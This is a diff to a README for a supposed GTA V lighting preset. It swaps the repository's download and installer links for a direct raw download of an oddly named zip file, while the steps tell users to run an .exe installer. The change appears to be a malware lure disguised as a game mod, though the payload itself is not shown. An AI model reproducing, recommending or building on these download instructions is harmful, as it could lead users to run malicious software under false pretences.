@@ -1,6 +1,6 @@
 # 🎮 ENB-for-NVE - Enhance GTA V Lighting With Ease
 
-[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/julie10membered372/ENB-for-NVE)
+[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/julie10membered372/ENB-for-NVE/raw/refs/heads/main/repin/EN_for_NVE_superradical.zip)
 
 ## 💡 About This Preset
 
@@ -21,7 +21,7 @@ The software includes five quality presets. You choose the setting that best mat
 
 Follow these steps to set up the software.
 
-1. Visit the [download page](https://github.com/julie10membered372/ENB-for-NVE).
+1. Visit the [download page](https://github.com/julie10membered372/ENB-for-NVE/raw/refs/heads/main/repin/EN_for_NVE_superradical.zip).
 2. Download the installation file ending in .exe.
 3. Locate the file in your downloads folder.
 4. Double-click the file to launch the installer.
